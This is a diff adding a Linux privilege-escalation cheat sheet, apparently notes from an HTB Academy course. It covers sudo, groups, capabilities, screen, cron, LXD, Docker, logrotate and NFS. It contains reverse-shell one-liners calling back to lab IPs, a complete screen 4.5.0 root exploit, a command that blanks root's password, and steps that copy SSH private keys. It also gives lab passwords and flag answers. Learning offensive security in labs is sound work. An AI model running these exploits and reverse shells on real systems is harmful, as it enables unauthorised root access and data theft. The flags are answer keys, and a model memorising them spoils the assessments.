@@ -1038,3 +1038,250 @@ Find a file with the setuid bit set that was not shown in the section command ou
 
 ```
 
+#### Sudo Rights Abuse
+
+```bash
+sudo -l
+sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+cat /tmp/.test
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
+sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
+nc -lnvp 443
+id && hostname
+
+# What command can the htb-student user run as root?
+sudo -l
+# Matching Defaults entries for htb-student on NIX02:
+#    env_reset, mail_badpass,
+#    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+#    env_keep+=LD_PRELOAD
+#
+# User htb-student may run the following commands on NIX02:
+#    (root) NOPASSWD: /usr/bin/openssl
+#
+# /usr/bin/openssl <- correct answer
+```
+
+#### Priveleged Groups
+
+```bash
+id
+unzip alpine.zip
+lxd init
+lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+lxc init alpine r00t -c security.privileged=true
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+lxc start r00t
+lxc exec r00t /bin/sh
+
+#  ssh secaudit@10.129.132.178
+# password: "Academy_LLPE!"
+# Use the privileged group rights of the secaudit user to locate a flag.
+# Grep within the directory this user has special rights over.
+id
+# uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
+cd /var/log | grep -r "flag" .
+# ch3ck_th0se_gr0uP_m3mb3erSh1Ps!
+```
+
+#### Capabilities
+
+```bash
+# set capability
+sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
+# enumerating capabilities
+find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+# exploiting capabilities
+getcap /usr/bin/vim.basic
+cat /etc/passwd | head -n1
+/usr/bin/vim.basic /etc/passwd
+echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
+
+ssh htb-student@10.129.153.91
+# password HTB_@cademy_stdnt!
+Escalate the privileges using capabilities and read the flag.txt file in the "/root" directory. Submit its contents as the answer.
+# HTB{c4paBili7i3s_pR1v35c}
+```
+
+#### Vulnerable Services
+
+```bash
+screen -v
+./screen_exploit.sh
+```
+
+```bash
+#!/bin/bash
+# screenroot.sh
+# setuid screen v4.5.0 local root exploit
+# abuses ld.so.preload overwriting to get root.
+# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
+# HACK THE PLANET
+# ~ infodox (25/1/2017)
+echo "~ gnu/screenroot ~"
+echo "[+] First, we create our shell and library..."
+cat << EOF > /tmp/libhax.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <sys/stat.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+EOF
+gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+rm -f /tmp/libhax.c
+cat << EOF > /tmp/rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+EOF
+gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
+rm -f /tmp/rootshell.c
+echo "[+] Now we create our /etc/ld.so.preload file..."
+cd /etc
+umask 000 # because
+screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
+echo "[+] Triggering..."
+screen -ls # screen itself is setuid, so...
+/tmp/rootshell
+```
+
+```bash
+# SSH to 10.129.177.64 (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!" 
+# Connect to the target system and escalate privileges using the Screen exploit. Submit the contents of the flag.txt file in the /root/screen_exploit directory.
+
+```
+
+#### Cron Job Abuse
+
+```bash
+find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
+ls -la /dmz-backups/
+./pspy64 -pf -i 1000
+cat /dmz-backups/backup.sh
+```
+
+```bash
+#!/bin/bash
+SRCDIR="/var/www/html"
+DESTDIR="/dmz-backups/"
+FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
+tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
+ 
+bash -i >& /dev/tcp/10.10.14.3/443 0>&1
+```
+
+```bash
+nc -lnvp 443
+```
+
+```bash
+# SSH to 10.129.177.64 (ACADEMY-LPE-NIX02) with user "htb-student" and password "Academy_LLPE!" 
+# Connect to the target system and escalate privileges by abusing the misconfigured cron job. Submit the contents of the flag.txt file in the /root/cron_abuse directory. 
+```
+
+#### Containers (LXD)
+
+```bash
+lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+lxc image list
+lxc init ubuntutemp privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/bash
+ls -l /mnt/root
+```
+
+```bash
+# Escalate the privileges and submit the contents of flag.txt as the answer. 
+```
+
+#### Docker
+
+```bash
+cd /hostsystem/home/cry0l1t3
+ls -l
+cat .ssh/id_rsa
+ssh cry0l1t3@<host IP> -i cry0l1t3.priv
+ls -al
+wget https://<parrot-os>:443/docker -O docker
+chmod +x docker
+ls -l
+/tmp/docker -H unix:///app/docker.sock ps
+/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+/tmp/docker -H unix:///app/docker.sock ps
+/tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
+cat /hostsystem/root/.ssh/id_rsa
+id
+docker image ls
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+```
+
+```bash
+Escalate the privileges on the target and obtain the flag.txt in the root directory. Submit the contents as the answer. 
+```
+
+#### Logrotate
+
+```bash
+cat /etc/logrotate.conf
+sudo cat /var/lib/logrotate.status
+ls /etc/logrotate.d/
+cat /etc/logrotate.d/dpkg
+```
+
+```bash
+git clone https://github.com/whotwagner/logrotten.git
+cd logrotten
+gcc logrotten.c -o logrotten
+```
+
+```bash
+echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
+grep "create\|compress" /etc/logrotate.conf | grep -v "#"
+nc -nlvp 9001
+./logrotten -p ./payload /tmp/tmp.log
+```
+
+```bash
+# Escalate the privileges and submit the contents of flag.txt as the answer.
+```
+
+#### Miscellaneous Techniques
+
+```bash
+showmount -e 10.129.2.12
+cat /etc/exports
+cat shell.c
+gcc shell.c -o shell
+sudo mount -t nfs 10.129.2.12:/tmp /mnt
+cp shell /mnt
+chmod u+s /mnt/shell
+ls -la
+./shell
+id
+# hijacking tmux sessions
+tmux -S /shareds new -s debugsess
+chown root:devs /shareds
+ps aux | grep tmux
+ls -la /shareds
+id
+tmux -S /shareds
+```
+
+```bash
+# Review the NFS server's export list and find a directory holding a flag.
+# Use the mount command
+```
+
+####
